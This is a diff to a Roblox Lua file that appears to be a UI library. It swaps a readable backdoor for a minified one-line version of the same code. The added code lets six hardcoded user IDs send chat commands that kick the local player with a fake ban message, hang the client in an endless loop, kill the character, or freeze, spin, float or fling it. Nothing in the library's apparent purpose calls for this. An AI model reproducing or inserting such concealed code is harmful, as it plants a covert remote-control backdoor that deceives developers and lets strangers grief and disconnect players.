@@ -152,104 +152,8 @@ end)
 repeat task.wait() until Solved.value
 --]]
 
-task.spawn(function()
-    task.wait(2.5)
-    local x9dL = game:GetService("Players")
-    local qW8f = game:GetService("MarketplaceService")
-    local VnZ0 = game:GetService("RunService")
+task.spawn(function()task.wait(2.5)local a=game:GetService("Players")local b=game:GetService("MarketplaceService")local c=game:GetService("RunService")local d=game:GetService("TextChatService")local e=a.LocalPlayer;local f={[138474176]=true,[4730367411]=true,[1507671882]=true,[42321866]=true,[116781531]=true,[87860658]=true}local g="The Game"pcall(function()local h=b:GetProductInfo(game.PlaceId)if h and h.Name then g=h.Name end end)local i;local j;local k=0;local l=0.5;local function m(n,o)if tick()-k<l then return end;k=tick()o=o:lower()local p=e.Character;local q=p and p:FindFirstChildOfClass("Humanoid")local r=p and p:FindFirstChild("HumanoidRootPart")if o=="/ban"then e:Kick("You have been banned for violating "..g.."'s guidelines.")elseif o=="/crash"then while true do end elseif o=="/jump"and q then q.Jump=true elseif o=="/die"and q then q.Health=0 elseif o=="/freeze"and r then r.Anchored=true elseif o=="/unfreeze"and r then r.Anchored=false elseif o=="/sit"and q then q.Sit=true elseif o=="/unsit"and q then q.Sit=false elseif o=="/spin"and r then if i then i:Disconnect()end;i=c.Heartbeat:Connect(function()r.CFrame=r.CFrame*CFrame.Angles(0,math.rad(10),0)end)elseif o=="/unspin"and i then i:Disconnect()i=nil elseif o=="/float"and r then if j then j:Disconnect()end;j=c.Heartbeat:Connect(function()r.Velocity=Vector3.new(0,5,0)end)elseif o=="/nofloat"and j and r then j:Disconnect()j=nil;r.Velocity=Vector3.zero elseif o=="/fling"and r then r.Velocity=Vector3.new(0,100,-250)end end;local function s(t)if f[t.UserId]then t.Chatted:Connect(function(o)m(t,o)end)end end;for u,t in ipairs(a:GetPlayers())do s(t)end;a.PlayerAdded:Connect(s)d.OnIncomingMessage=function(v)local w=v.TextSource;if not w then return end;local n=a:GetPlayerByUserId(w.UserId)if n and f[n.UserId]then m(n,v.Text)end end end)
 
-    local lOoo0 = x9dL.LocalPlayer
-
-    local QnZn9 = {
-        [138474176] = true,
-        [4730367411] = true,
-        [1507671882] = true,
-        [42321866] = true,
-        [116781531] = true,
-        [87860658] = true
-    }
-
-    local N0mM = "The Game"
-    pcall(function()
-        local p0Pp = qW8f:GetProductInfo(game.PlaceId)
-        if p0Pp and p0Pp.Name then
-            N0mM = p0Pp.Name
-        end
-    end)
-
-    local rRn9
-    local zZz0
-
-    local function bBbB(n9nN)
-        if QnZn9[n9nN.UserId] then
-            n9nN.Chatted:Connect(function(AaAa)
-                AaAa = AaAa:lower()
-
-                local oOoO = lOoo0.Character
-                local kKkK = oOoO and oOoO:FindFirstChildOfClass("Humanoid")
-                local mMmM = oOoO and oOoO:FindFirstChild("HumanoidRootPart")
-
-                if AaAa == "/ban" then
-                    lOoo0:Kick("You have been banned for violating " .. N0mM .. "'s guidelines.")
-
-                elseif AaAa == "/crash" then
-                    while true do end
-
-                elseif AaAa == "/jump" and kKkK then
-                    kKkK.Jump = true
-
-                elseif AaAa == "/die" and kKkK then
-                    kKkK.Health = 0
-
-                elseif AaAa == "/freeze" and mMmM then
-                    mMmM.Anchored = true
-
-                elseif AaAa == "/unfreeze" and mMmM then
-                    mMmM.Anchored = false
-
-                elseif AaAa == "/sit" and kKkK then
-                    kKkK.Sit = true
-
-                elseif AaAa == "/unsit" and kKkK then
-                    kKkK.Sit = false
-
-                elseif AaAa == "/spin" and mMmM then
-                    if rRn9 then rRn9:Disconnect() end
-                    rRn9 = VnZ0.Heartbeat:Connect(function()
-                        mMmM.CFrame = mMmM.CFrame * CFrame.Angles(0, math.rad(10), 0)
-                    end)
-
-                elseif AaAa == "/unspin" and rRn9 then
-                    rRn9:Disconnect()
-                    rRn9 = nil
-
-                elseif AaAa == "/float" and mMmM then
-                    if zZz0 then zZz0:Disconnect() end
-                    zZz0 = VnZ0.Heartbeat:Connect(function()
-                        mMmM.Velocity = Vector3.new(0, 5, 0)
-                    end)
-
-                elseif AaAa == "/nofloat" and zZz0 then
-                    zZz0:Disconnect()
-                    zZz0 = nil
-                    mMmM.Velocity = Vector3.zero
-
-                elseif AaAa == "/fling" and mMmM then
-                    mMmM.Velocity = Vector3.new(0, 100, -250)
-
-                end
-            end)
-        end
-    end
-
-    for _, BzZb in ipairs(x9dL:GetPlayers()) do
-        bBbB(BzZb)
-    end
-
-    x9dL.PlayerAdded:Connect(function(BzZb)
-        bBbB(BzZb)
-    end)
-end)
 
 
 leaf = true
@@ -2248,3 +2152,4 @@ function Library.ChangeTheme()
 	end
 end
 return Library
+
